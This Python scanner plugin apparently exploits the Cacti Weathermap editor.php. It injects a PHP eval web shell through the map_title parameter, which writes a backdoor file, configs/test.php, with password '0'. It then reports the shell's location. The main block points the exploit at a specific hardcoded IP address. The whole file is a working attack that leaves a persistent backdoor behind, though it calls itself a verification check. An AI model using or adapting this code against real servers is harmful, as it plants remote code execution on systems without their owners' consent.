#!/usr/bin/env python
# encoding: utf-8
from t import T

import requests,urllib2,json,urlparse
class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        target_url = "http://"+ip+":"+str(port)+"/plugins/weathermap/editor.php"
        result = {}
        result['result']=False
        r=None
        try:
            r=requests.get(url=target_url,timeout=2)
            if r.status_code==200:

                shell_url = "http://"+ip+":"+str(port)+"/plugins/weathermap/editor.php?plug=0&mapname=test.php&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=<?php echo(md5(1));@eval($_POST[0]);?>&map_legend=Traffic+Load&map_stamp=Created:+%b+%d+%Y+%H:%M:%S&map_linkdefaultwidth=7&map_linkdefaultbwin=100M&map_linkdefaultbwout=100M&map_width=800&map_height=600&map_pngfile=&map_htmlfile=&map_bgfile=--NONE--&mapstyle_linklabels=percent&mapstyle_htmlstyle=overlib&mapstyle_a rrowstyle=classic&mapstyle_nodefont=3&mapstyle_linkfont=2&mapstyle_legendfont=4&item_configtext=Name"
                r=requests.get(url=shell_url,timeout=2)
                if r.status_code == 200:
                    result['result'] = True
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['type'] = 'cacti weathermap code exploit'
                    result['VerifyInfo']['URL'] = ip + "/plugins/weathermap/editor.php"
                    result['VerifyInfo']['payload'] = 'IP/plugins/weathermap/editor.php'
                    result['VerifyInfo']['result'] = r.text
                    result['VerifyInfo']['shellurl'] ='plugins/weathermap/configs/test.php  pass is 0'
                    result['VerifyInfo']['level'] = 'hole'
                
            else:
                target_url = "http://"+ip+":"+str(port)+"/cacti/plugins/weathermap/editor.php"

                r=requests.get(url=target_url,timeout=2)
                if r.status_code==200:

                    shell_url = "http://"+ip+":"+str(port)+"/cacti/plugins/weathermap/editor.php?plug=0&mapname=test.php&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=<?php echo(md5(1));@eval($_POST[0]);?>&map_legend=Traffic+Load&map_stamp=Created:+%b+%d+%Y+%H:%M:%S&map_linkdefaultwidth=7&map_linkdefaultbwin=100M&map_linkdefaultbwout=100M&map_width=800&map_height=600&map_pngfile=&map_htmlfile=&map_bgfile=--NONE--&mapstyle_linklabels=percent&mapstyle_htmlstyle=overlib&mapstyle_a rrowstyle=classic&mapstyle_nodefont=3&mapstyle_linkfont=2&mapstyle_legendfont=4&item_configtext=Name"
                    r=requests.get(url=shell_url,timeout=2)
                    if r.status_code == 200:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['shellurl'] ='/cacti/plugins/weathermap/configs/test.php  pass is 0'
                        result['result'] = True

                        result['VerifyInfo']['type'] = 'cacti weathermap code exploit'
                        result['VerifyInfo']['URL'] = ip + "/cacti/plugins/weathermap/editor.php"
                        result['VerifyInfo']['payload'] = 'IP/cacti/plugins/weathermap/editor.php'
                        result['VerifyInfo']['result'] = r.text
                        result['VerifyInfo']['level'] = 'hole'
        except Exception,e:
            print e.text
        finally:
            if r is not None:
                r.close()
                del r
            return result
if __name__ == '__main__':
    print P().verify(ip='140.114.108.4',port='80')
